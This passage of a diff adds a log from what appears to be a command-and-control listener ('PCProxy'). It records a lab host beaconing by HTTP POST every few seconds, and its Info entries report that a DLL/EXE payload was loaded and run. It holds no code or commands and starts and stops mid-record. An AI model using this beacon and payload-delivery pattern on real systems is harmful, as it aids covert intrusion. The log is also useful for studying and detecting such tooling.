+TlEo: 0e59a2bc9:0000000e
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000000e</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:41:48'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49305</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>14</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:41:48'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49305</Port>
+  </Target>
+  <Id>0x00000f5ce59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:41:50'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:41:50'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49306</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:41:50'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000000f
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000000f</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:41:50'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49306</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>15</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:41:50'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49306</Port>
+  </Target>
+  <Id>0x00000f5ce59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:41:53'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:41:53'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49307</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:41:53'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000010
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000010</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:41:53'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49307</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>16</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:41:53'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49307</Port>
+  </Target>
+  <Id>0x00000f5ce59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:41:56'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:41:56'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49308</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:41:56'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000011
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000011</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:41:56'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49308</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>17</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:41:56'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49308</Port>
+  </Target>
+  <Id>0x00000f5ce59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:41:59'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:41:59'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49309</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:41:59'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000012
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000012</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:41:59'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49309</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>18</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:41:59'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49309</Port>
+  </Target>
+  <Id>0x00000f5ce59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:42:02'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:42:02'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49310</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:42:02'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000013
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 96
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>309</BytesRead>
+  <HeaderLength>213</HeaderLength>
+  <ConnectIndex>00000013</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:42:02'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49310</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>19</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:42:02'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49310</Port>
+  </Target>
+  <Id>0x00000f5ce59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxyConnection_DataBytesSent lptimestamp='2017-10-16T09:42:02'>
+  <Id>0x00000f5ce59a2bc9</Id>
+  <DataSent>96</DataSent>
+  <TotalBytes>96</TotalBytes>
+</PCProxyConnection_DataBytesSent>
+<Info lptimestamp='2017-10-16T09:42:02'>Data (Payload) has been received and stored by remote side
+</Info>
+<Info lptimestamp='2017-10-16T09:42:02'>... Receiving Acknowledgements
+</Info>
+<Info lptimestamp='2017-10-16T09:42:02'>Received successful status message for Dll/Exe loaded</Info>
+<Info lptimestamp='2017-10-16T09:42:02'>Received successful status message for About to run payload</Info>
+<Info lptimestamp='2017-10-16T09:42:02'>Received successful status message for Exit This Message Loop</Info>
+<Info lptimestamp='2017-10-16T09:42:02'>
+</Info>
+<RemoteAddress lptimestamp='2017-10-16T09:42:02'>z0.0.0.12</RemoteAddress>
+<Info lptimestamp='2017-10-16T09:42:02'>Setting remote address to z0.0.0.12</Info>
+<PCProxy_Activity lptimestamp='2017-10-16T09:42:05'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:42:05'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49311</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:42:05'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000014
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000014</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:42:05'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49311</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>20</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:42:05'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49311</Port>
+  </Target>
+  <Id>0x00000eece59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:42:08'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:42:08'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49312</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:42:08'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000015
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 324
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>500</BytesRead>
+  <HeaderLength>214</HeaderLength>
+  <ConnectIndex>00000015</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:42:08'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49312</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>21</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:42:08'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49312</Port>
+  </Target>
+  <Id>0x00000eece59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxyConnection_DataBytesSent lptimestamp='2017-10-16T09:42:08'>
+  <Id>0x00000eece59a2bc9</Id>
+  <DataSent>324</DataSent>
+  <TotalBytes>324</TotalBytes>
+</PCProxyConnection_DataBytesSent>
+<PCProxy_Activity lptimestamp='2017-10-16T09:42:11'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:42:11'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49313</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:42:11'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000016
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 180
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>394</BytesRead>
+  <HeaderLength>214</HeaderLength>
+  <ConnectIndex>00000016</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:42:11'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49313</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>22</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:42:11'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49313</Port>
+  </Target>
+  <Id>0x00000eece59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxyConnection_DataBytesSent lptimestamp='2017-10-16T09:42:11'>
+  <Id>0x00000eece59a2bc9</Id>
+  <DataSent>180</DataSent>
+  <TotalBytes>180</TotalBytes>
+</PCProxyConnection_DataBytesSent>
+<PCProxy_Activity lptimestamp='2017-10-16T09:42:14'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:42:14'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49314</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:42:14'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000017
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000017</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:42:14'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49314</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>23</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:42:14'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49314</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:42:17'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:42:17'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49315</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:42:17'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000018
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000018</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:42:17'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49315</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>24</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:42:17'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49315</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:42:19'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:42:19'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49316</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:42:19'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000019
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000019</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:42:19'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49316</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>25</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:42:19'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49316</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:42:22'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:42:22'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49317</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:42:22'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000001a
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000001a</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:42:22'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49317</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>26</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:42:22'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49317</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:42:25'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:42:25'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49318</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:42:25'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000001b
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000001b</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:42:25'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49318</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>27</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:42:25'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49318</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:42:28'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:42:28'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49319</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:42:28'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000001c
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000001c</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:42:28'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49319</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>28</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:42:28'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49319</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:42:31'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:42:31'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49320</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:42:31'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000001d
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000001d</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:42:31'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49320</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>29</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:42:31'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49320</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:42:34'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:42:34'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49321</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:42:34'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000001e
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000001e</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:42:34'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49321</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>30</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:42:34'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49321</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:42:36'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:42:36'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49322</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:42:36'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000001f
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000001f</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:42:36'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49322</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>31</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:42:36'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49322</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:42:39'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:42:39'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49323</Port>
+  </Target>
